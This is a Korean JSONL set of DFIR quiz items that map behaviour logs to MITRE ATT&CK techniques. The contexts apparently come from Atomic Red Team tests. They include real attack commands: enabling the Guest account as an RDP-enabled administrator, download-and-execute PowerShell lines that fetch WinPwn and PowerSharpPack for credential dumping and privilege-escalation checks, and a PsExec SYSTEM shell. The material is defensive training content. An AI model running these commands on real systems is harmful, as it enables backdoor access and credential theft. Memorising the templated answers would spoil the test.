{"id": "T1078.001_99747561-ed8d-47f2-9c91-1e5fde1ed6e0_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1078.001 Valid Accounts: Default Accounts (Tactic: Initial Access, Persistence, Privilege Escalation)\n[요약] 기본 Guest 계정을 활성화하고 비밀번호를 설정한 뒤, 로컬 Administrators 그룹과 Remote Desktop Users 그룹에 추가한다. 동시에 레지스트리 설정을 변경해 RDP(원격 데스크톱) 접속을 허용하여, Guest 계정을 통한 원격 관리자 접속 시나리오를 모사한다.\n[절차] 1) Guest 계정 활성화 및 비밀번호 설정    - `net user #{guest_user} /active:yes` 로 Guest 계정을 활성화.    - `net user #{guest_user} #{guest_password}` 로 해당 계정에 비밀번호를 설정.  2) Guest 계정을 로컬 관리자 그룹에 추가    - `net localgroup #{local_admin_group} #{guest_user} /add`    - 이를 통해 Guest 계정이 관리자 권한을 획득(Privilege Escalation + Persistence)하는 시나리오를 모사.  3) Guest 계정을 Remote Desktop Users 그룹에 추가    - `net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add`    - 원격 데스크톱 접속이 가능한 그룹에 포함시켜, Guest 계정으로 RDP 접속을 허용.  4) RDP 연결 허용을 위한 레지스트리 설정 변경    - `reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f`    - `reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f`    - 위 설정으로 RDP 접속 거부를 해제하고, 원격 연결을 허용.  5) 탐지/포렌식 포인트    - 보안/시스템 로그에서 `net user`, `net localgroup` 실행 흔적 및 계정/그룹 변경 이벤트(Security 4720, 4728 등) 확인.    - 레지스트리 키 `HKLM\\System\\CurrentControlSet\\Control\\Terminal Server` 변경 이벤트 모니터링.    - 비정상적으로 Guest 계정이 활성화되었거나 관리자 그룹에 속해 있는지 정기 점검.  6) 정리(Cleanup) 시나리오    - Guest 계정 다시 비활성화, 관리자 및 RDP 그룹에서 제거.    - `remove_rdp_access_during_cleanup` 값이 1이면 RDP 설정을 이전 상태로 복원.\n[대표 명령 예시]\nnet user #{guest_user} /active:yes\r\nnet user #{guest_user} #{guest_password}\r\nnet localgroup #{local_admin_group} #{guest_user} /add\r\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\r\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\r\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f\nnet user #{guest_user} /active:no >nul 2>&1\r\nnet localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1\r\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1\r\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\r\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)\r\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)", "answer": "이 행위는 MITRE ATT&CK의 T1078.001 \"Valid Accounts: Default Accounts\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Initial Access, Persistence, Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1078.001_aa6cb8c4-b582-4f8e-b677-37733914abda_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1078.001 Valid Accounts: Default Accounts (Tactic: Initial Access, Persistence, Privilege Escalation)\n[요약] 기본 Guest 계정을 단순 활성화(Active: yes)만 수행하는 테스트로, 공격자가 별도 계정 생성 없이 기본 제공 계정을 되살려 사용하는 최소 시나리오를 모사한다.\n[절차] 1) Guest 계정 활성화    - 명령:        `net user #{guest_user} /active:yes`    - 이로 인해 기본 Guest 계정이 로그인 가능한 상태가 되며, 추가 권한 설정이 없더라도 로컬 로그인/네트워크 로그인 등에 사용될 수 있음.  2) 포렌식/탐지 포인트    - 보안 로그에서 계정 상태 변경 이벤트 (예: Event ID 4722 - 'A user account was enabled').    - 평소 사용되지 않던 Guest 계정으로의 로그인 시도/성공 이벤트 (4624, 4625 등) 모니터링.    - 로컬/도메인 보안 베이스라인에서 ‘Guest 계정은 항상 비활성화’ 상태여야 한다는 기준과 비교.  3) 테스트 종료 후 정리    - Guest 계정을 다시 비활성화:        `net user #{guest_user} /active:no`    - 실 운영 환경에서는 이 정리 단계가 반드시 수행되었는지 별도로 검증 필요.\n[대표 명령 예시]\nnet user #{guest_user} /active:yes\nnet user #{guest_user} /active:no", "answer": "이 행위는 MITRE ATT&CK의 T1078.001 \"Valid Accounts: Default Accounts\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Initial Access, Persistence, Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1078.003_a524ce99-86de-4db6-b4f9-e08f35a47a15_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1078.003 Valid Accounts: Local Accounts (Tactic: Initial Access, Persistence, Privilege Escalation)\n[요약] 새로운 로컬 계정 art-test를 생성하고, 비밀번호를 설정한 뒤, 로컬 Administrators 그룹에 추가하여 관리자 권한 로컬 계정을 만드는 시나리오를 모사한다.\n[절차] 1) 로컬 계정 art-test 생성    - 명령: `net user art-test /add`    - 설명: 로컬 SAM 데이터베이스에 art-test 사용자 계정을 추가한다(기본은 비활성/미지정 비밀번호 상태 아님, 다만 로그인에 사용할 비밀번호를 별도 설정해야 실제 사용 가능).  2) art-test 계정 비밀번호 설정    - 명령: `net user art-test #{password}`    - 설명: 제공된 입력 인자 `password` 값으로 art-test 계정의 비밀번호를 설정한다.  3) art-test를 Administrators 그룹에 추가    - 명령: `net localgroup administrators art-test /add`    - 설명: 로컬 관리자 그룹에 새 계정을 포함시켜, 해당 계정으로 로그인 시 관리자 권한을 가지도록 한다.  4) 탐지/포렌식 포인트    - 보안 로그에서 계정 생성 이벤트(예: 4720), 그룹 변경 이벤트(4728) 등을 모니터링.    - `net user`, `net localgroup` 실행 흔적 및 프로세스 생성(Event ID 4688) 추적.    - 비정상적인 신규 로컬 관리자 계정 존재 여부에 대한 주기적인 점검.  5) 테스트 종료 후 정리    - art-test를 Administrators 그룹에서 제거하고, 계정 자체를 삭제.    - 실환경에서는 테스트 후 반드시 계정 삭제 여부를 확인해야 한다.\n[대표 명령 예시]\nnet user art-test /add\r\nnet user art-test #{password}\r\nnet localgroup administrators art-test /add\nnet localgroup administrators art-test /delete >nul 2>&1\r\nnet user art-test /delete >nul 2>&1", "answer": "이 행위는 MITRE ATT&CK의 T1078.003 \"Valid Accounts: Local Accounts\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Initial Access, Persistence, Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1078.003_9e9fd066-453d-442f-88c1-ad7911d32912_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1078.003 Valid Accounts: Local Accounts (Tactic: Initial Access, Persistence, Privilege Escalation)\n[요약] WinPwn.ps1 스크립트를 다운로드·로드한 후, `obfuskittiedump` 함수를 사용해 로컬 자격증명(cred)을 수집하는 시나리오를 모사한다. 공격자가 생성한/탈취한 로컬 계정을 활용해 추가 권한 확보와 크리덴셜 덤프를 수행하는 상황에 해당한다.\n[절차] 1) WinPwn.ps1 다운로드 및 메모리 상 로드    - 명령:        `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`    - 설명: `Net.WebClient` 를 이용해 WinPwn.ps1 내용을 문자열로 다운로드한 뒤, `iex` 로 즉시 실행(메모리 로드)한다.  2) obfuskittiedump 함수 실행    - 명령:        `obfuskittiedump -consoleoutput -noninteractive`    - 설명: WinPwn 내 obfuskittiedump 기능을 호출하여 로컬 자격증명을 추출하고, 콘솔에 결과를 출력한다(비대화식).  3) 탐지/포렌식 포인트    - PowerShell 로그(Operational, ScriptBlockLogging)에서 `downloadstring`, `iex`, WinPwn 관련 스트링 탐지.    - 의심스러운 메모리 읽기/덤프 이벤트(예: LSASS 접근) 모니터링.    - 비정상적인 계정 사용 + 크리덴셜 덤프 도구 호출을 연관 분석(UEBA, SIEM 규칙 등).\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\r\nobfuskittiedump -consoleoutput -noninteractive", "answer": "이 행위는 MITRE ATT&CK의 T1078.003 \"Valid Accounts: Local Accounts\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Initial Access, Persistence, Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1078.003_e9fdb899-a980-4ba4-934b-486ad22e22f4_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1078.003 Valid Accounts: Local Accounts (Tactic: Initial Access, Persistence, Privilege Escalation)\n[요약] WinPwn.ps1 스크립트를 로드한 뒤, `safedump` 기능을 사용해 Mimikatz 유사(Safetykatz) 기법으로 로컬 크리덴셜을 덤프하는 시나리오를 재현한다.\n[절차] 1) WinPwn.ps1 다운로드 및 로드    - 명령:        `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`  2) safedump 함수 호출    - 명령:        `safedump -consoleoutput -noninteractive`    - 설명: Mimikatz 유사 동작을 수행하는 Safetykatz 기반 크리덴셜 덤프를 실행하고, 콘솔에 결과를 출력한다.  3) 탐지/포렌식 포인트    - PowerShell ScriptBlock 로그에서 WinPwn·Safetykatz 관련 함수 호출 감시.    - LSASS 프로세스 핸들 접근 이벤트, 메모리 덤프 도구 실행 기록 등 수집.    - 비정상 로컬 계정/관리자 계정 로그인 직후 이러한 도구 실행 여부 상관 분석.\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\r\nsafedump -consoleoutput -noninteractive", "answer": "이 행위는 MITRE ATT&CK의 T1078.003 \"Valid Accounts: Local Accounts\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Initial Access, Persistence, Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1078.003_6904235f-0f55-4039-8aed-41c300ff7733_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1078.003 Valid Accounts: Local Accounts (Tactic: Initial Access, Persistence, Privilege Escalation)\n[요약] Sysinternals의 PsExec를 이용해 로컬 시스템 계정(NT AUTHORITY\\SYSTEM)으로 cmd.exe를 실행하고, whoami를 수행해 SYSTEM 권한 획득을 확인하는 시나리오를 모사한다. 공격자가 로컬 계정을 이용해 추가 권한 상승을 시도하는 대표적인 패턴이다.\n[절차] 1) 사전 준비(Atomic 원문 기준)    - (의존성) `PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe` 가 없으면, PSTools.zip 다운로드 후 압축을 풀어 PsExec.exe를 지정 경로에 복사.  2) PsExec를 이용해 SYSTEM 권한 쉘 호출    - 명령:        `\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami`    - 옵션 설명:        - `-accepteula` : EULA(라이선스 동의)를 자동으로 수락.        - `-s` : 프로세스를 Local System 계정으로 실행.        - `%COMSPEC% /c whoami` : 기본 cmd.exe로 `whoami` 명령을 실행하고 종료.  3) 기대 결과    - 콘솔 출력에 `nt authority\\system` 이 표시되면 SYSTEM 권한 실행에 성공한 것.  4) 탐지/포렌식 포인트    - PsExec.exe 실행 흔적(프로세스 생성 로그, 명령줄 인자, 경로).    - 보안 로그에서 권한 상승 이벤트, 토큰 조작, 서비스 생성/삭제 여부.    - SYSTEM 계정에서 예상치 못한 명령/도구 실행 패턴 탐지(예: whoami, ipconfig, net user 등).\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami", "answer": "이 행위는 MITRE ATT&CK의 T1078.003 \"Valid Accounts: Local Accounts\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Initial Access, Persistence, Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] systeminfo와 디스크 Enum 레지스트리 키를 통해 OS와 디스크 정보를 수집하는 기본 시스템 정찰 동작을 모사한다.\n[절차] CMD에서 systeminfo를 실행해 OS·메모리·핫픽스 정보 등을 수집한다. reg query로 HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum 키를 조회해 디스크 장치 정보를 확인한다.\n[대표 명령 예시]\nsysteminfo & reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] hostname 명령으로 시스템의 호스트 이름을 수집하는 간단한 정찰 기법을 모사한다.\n[절차] CMD에서 hostname 명령을 실행한다. 출력된 호스트 이름을 기록한다.\n[대표 명령 예시]\nhostname", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] 레지스트리의 MachineGuid 값을 조회해 시스템 고유 식별자를 수집하는 정찰 동작을 모사한다.\n[절차] reg query로 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography 키를 조회한다. MachineGuid 값을 읽어 고유 식별자로 활용한다.\n[대표 명령 예시]\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] Griffon 악성코드 계열에서 사용된 정찰 VBS 스크립트를 로컬에서 실행해 OS·브라우저·네트워크 정보를 수집하는 행위를 모사한다.\n[절차] 지정된 경로에 griffon_recon.vbs 파일이 존재하는지 확인하거나 원격 저장소에서 다운로드한다. PowerShell에서 cscript를 호출해 VBS 스크립트를 실행하고 결과를 출력한다.\n[대표 명령 예시]\ncscript \"#{vbscript}\"", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] CMD의 set 명령을 사용해 현재 세션의 모든 환경 변수를 열람하는 정찰 동작을 모사한다.\n[절차] CMD에서 set 명령을 실행한다. 출력된 환경 변수를 통해 PATH, TEMP, 사용자 프로필 경로 등을 확인한다.\n[대표 명령 예시]\nset", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WinPwn 스크립트에서 winPEAS 함수를 호출해 로컬 권한 상승(Privilege Escalation)과 관련된 취약 구성을 자동 점검하는 시나리오를 모사한다.\n[절차] PowerShell에서 WinPwn.ps1을 원격 저장소(GitHub)에서 다운로드해 메모리로 로드한다. winPEAS -noninteractive -consoleoutput을 실행해 LPE 가능성 정보를 수집한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WinPwn의 itm4nprivesc 기능을 사용해 서비스 구성, ACL, UAC 설정 등 권한 상승에 악용 가능한 요소를 자동 점검하는 정찰 동작을 모사한다.\n[절차] WinPwn.ps1을 다운로드해 메모리로 로드한다. itm4nprivesc -noninteractive -consoleoutput 명령을 실행해 결과를 수집한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WinPwn의 oldchecks 기능을 통해 Powersploit 기반 권한 상승 체크를 수행하고, 결과 폴더를 여럿 생성하는 동작을 모사한다.\n[절차] WinPwn.ps1을 다운로드해 로드한다. oldchecks -noninteractive -consoleoutput으로 다양한 LPE 관련 체크를 수행한다. 정리 시 생성된 결과 폴더들을 삭제한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WinPwn의 otherchecks 기능으로 일반적인 권한 상승 관련 설정들을 광범위하게 점검하는 동작을 모사한다.\n[절차] WinPwn.ps1을 다운로드해 로드한다. otherchecks -noninteractive -consoleoutput을 실행한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-10_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WinPwn GeneralRecon 기능을 사용해 계정, 서비스, 네트워크 등 일반 시스템 정보를 폭넓게 수집하는 정찰 동작을 모사한다.\n[절차] WinPwn.ps1을 다운로드해 로드한다. Generalrecon -consoleoutput -noninteractive 명령으로 종합 정찰을 수행한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-11_Q11", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WinPwn Morerecon 기능을 통해 추가적인 로컬 시스템 정보를 수집하는 정찰 동작을 모사한다.\n[절차] WinPwn.ps1을 다운로드해 로드한다. Morerecon -noninteractive -consoleoutput을 실행해 세부 정보를 수집한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-12_Q12", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] WinPwn의 RBCD-Check 기능을 사용해 도메인 환경에서 Resource-Based Constrained Delegation 취약 구성을 점검하는 정찰 동작을 모사한다.\n[절차] WinPwn.ps1을 다운로드해 로드한다. RBCD-Check -consoleoutput -noninteractive 명령을 실행한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-13_Q13", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] PowerSharpPack의 Invoke-SharpWatson를 사용해 시스템에 적용되지 않은 Windows 패치를 탐지하는 정찰 동작을 모사한다.\n[절차] GitHub에서 Invoke-SharpWatson.ps1을 다운로드해 PowerShell 메모리로 로드한다. Invoke-watson을 실행해 누락된 패치 및 취약점을 식별한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1082_T1082-14_Q14", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1082 System Information Discovery (Tactic: Discovery)\n[요약] Invoke-SharpUp를 사용해 서비스, UAC, 파일·레지스트리 권한 등 일반적인 권한 상승 벡터를 자동 점검하는 동작을 모사한다.\n[절차] Invoke-SharpUp.ps1을 GitHub에서 다운로드해 로드한다. Invoke-SharpUp -command \"audit\"으로 전체 감사(audit)를 수행한다.\n[대표 명령 예시]\n$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\"", "answer": "이 행위는 MITRE ATT&CK의 T1082 \"System Information Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
